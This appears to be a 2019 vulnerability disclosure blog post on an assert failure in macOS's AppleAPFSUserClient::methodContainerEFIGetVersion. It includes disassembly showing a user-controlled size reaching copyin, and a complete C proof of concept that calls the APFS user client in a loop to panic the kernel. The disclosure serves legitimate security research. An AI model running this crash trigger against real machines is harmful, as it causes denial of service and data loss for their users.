---
layout: default
author: juwei lin
date: 2019-02-02 10:16:00 +0800
---

# Apple APFS copyin assert failure case 

## Overview
There is an assert failure case in function `AppleAPFSUserClient::methodContainerEFIGetVersion`.  

## Root Cause Analysis

In function `AppleAPFSUserClient::methodContainerEFIGetVersion`:
```
__text:0000000000016146 ; AppleAPFSUserClient::methodContainerEFIGetVersion(AppleAPFSUserClient*, void *, IOExternalMethodArguments *)
__text:0000000000016146 __ZN19AppleAPFSUserClient28methodContainerEFIGetVersionEPS_PvP25IOExternalMethodArguments proc near
__text:0000000000016146                                         ; DATA XREF: __const:00000000000F92D0o
__text:0000000000016146
__text:0000000000016146 var_68          = qword ptr -68h
__text:0000000000016146 var_60          = qword ptr -60h
__text:0000000000016146 var_58          = qword ptr -58h
__text:0000000000016146 var_50          = qword ptr -50h
__text:0000000000016146 var_48          = qword ptr -48h
__text:0000000000016146 var_40          = qword ptr -40h
__text:0000000000016146 var_38          = qword ptr -38h
__text:0000000000016146 var_30          = dword ptr -30h
__text:0000000000016146 var_2C          = dword ptr -2Ch
__text:0000000000016146
__text:0000000000016146                 push    rbp
__text:0000000000016147                 mov     rbp, rsp
__text:000000000001614A                 push    r15
__text:000000000001614C                 push    r14
__text:000000000001614E                 push    r13
__text:0000000000016150                 push    r12
__text:0000000000016152                 push    rbx
__text:0000000000016153                 sub     rsp, 48h
__text:0000000000016157                 mov     r15, rdi
__text:000000000001615A                 mov     rax, [rdx+30h]  ; structinput
__text:000000000001615E                 mov     rdx, [rdx+58h]
__text:0000000000016162                 mov     r12, [rax]
__text:0000000000016165                 mov     esi, [rax+8]    ; user-supplied size ---(1.a)
__text:0000000000016168                 test    r12, r12
__text:000000000001616B                 jz      short loc_161BE
__text:000000000001616D                 mov     r14, rdx
__text:0000000000016170                 mov     edi, 1
__text:0000000000016175                 mov     rbx, rsi
__text:0000000000016178                 call    __apfs_calloc ---(1.b)
__text:000000000001617D                 test    rax, rax
__text:0000000000016180                 jz      short loc_161C3
__text:0000000000016182                 mov     rdi, r12
__text:0000000000016185                 mov     r12, rax
__text:0000000000016188                 mov     rsi, rax
__text:000000000001618B                 mov     r13, rbx
__text:000000000001618E                 mov     rdx, rbx
__text:0000000000016191                 call    _copyin ---(1.c)
```

At 1.b, apfs_calloc calls MALLOC to allocate memory with size assigned from user, at 1.c user buffer will copyin to the new allocated memory. If user set the size as 65MB and apfs_calloc succeed allocation, copyin will panic due to too large memory copy.

## PoC Code

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <IOKit/IOKitLib.h>


void trigger(io_connect_t conn)
{
    uint64_t INPUTSCALAR[8];
    uint32_t INPUTSCALARCNT = 0;
    
    char INPUTSTRUCT[4096];
    size_t INPUTSTRUCTCNT = 16;
    
    uint64_t OUTPUTSCALAR[8] = {0};
    uint32_t OUTPUTSCALARCNT = 0;
    
    char OUTPUTSTRUCT[4096];
    size_t OUTPUTSTRUCTCNT = 8;
    
    //FILL INPUT
    *(uint64_t*)(&INPUTSTRUCT[0]) = (uint64_t)INPUTSCALAR;
    //*(uint64_t*)&(INPUTSTRUCT[8]) = 1919249516;
    *(uint64_t*)&(INPUTSTRUCT[8]) = 68157440;
    

    kern_return_t kr = IOConnectCallMethod(
                            conn,
                            12,
                            INPUTSCALAR,
                            INPUTSCALARCNT,
                            INPUTSTRUCT,
                            INPUTSTRUCTCNT,
                            OUTPUTSCALAR,
                            &OUTPUTSCALARCNT,
                            OUTPUTSTRUCT,
                            &OUTPUTSTRUCTCNT);
    if (kr != KERN_SUCCESS) {
        printf("send failure, err: 0x%x\n", kr);
    }
}


int main(){
    
    kern_return_t err;
    
    CFMutableDictionaryRef Matching = IOServiceMatching("AppleAPFSContainer");
    
    if(!Matching){
        
        printf("UNABLE TO CREATE SERVICE MATCHING DICTIONARY\n");
        
        return 0;
        
    }
    
    io_iterator_t iterator;
    
    err = IOServiceGetMatchingServices(kIOMasterPortDefault, Matching, &iterator);
    
    if (err != KERN_SUCCESS){
        
        printf("NO MATCHES\n");
        return 0;
    }
    
    io_service_t service = IOIteratorNext(iterator);
    
    if (service == IO_OBJECT_NULL){
        
        printf("UNABLE TO FIND SERVICE\n");
        
        return 0;
        
    }
    
    io_connect_t CONN = MACH_PORT_NULL;
    
    err = IOServiceOpen(service, mach_task_self(), 0, &CONN);
    
    if (err != KERN_SUCCESS){
        
        printf("UNABLE TO GET USER CLIENT CONNECTION\n");
        
        return 0;
        
    }else{
        
        printf("GOT USERCLIENT CONNECTION: %X, TYPE:%D\n", CONN, 0);
        
    }
    
    for (int i=0; i<1000; i++) {
        trigger(CONN);
    }
    
    
    printf("PANIC?\n");
    
    return 0;
    
}
```


## Panic log
See attachment.

## Q & A

### How did you find this vulnerability?
by fuzzing.

### Can you identify exploitability?
This is an assert failure, it cannot be used for exploit.

### Can you identify root cause?
Yes, see the root cause analysis.

### Vulnerable software and hardware
macOS 10.14.3 and all before